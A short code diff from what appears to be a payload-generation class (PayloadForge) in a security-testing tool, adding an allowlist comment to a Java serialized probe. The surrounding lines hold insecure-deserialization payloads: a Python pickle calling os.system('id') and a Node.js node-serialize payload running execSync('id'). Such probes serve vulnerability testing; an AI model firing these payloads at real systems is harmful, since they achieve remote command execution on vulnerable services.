@@ -540,7 +540,7 @@ class PayloadForge:
             "gASVFAAAAAAAAACMBHRlc3SFlC4=",  # 'test'
             'cos\nsystem\n(S"id"\ntR.',  # os.system('id')
             # Java Serialized Objects
-            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlme0AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==",
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlme0AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==",  # pragma: allowlist secret — Java serialization probe payload (rO0AB magic), not a credential
             # Node.js Serialized Objects
             "{\"rce\":\"_$$ND_FUNC$$_function (){return require('child_process').execSync('id').toString();}()\"}",
         ]
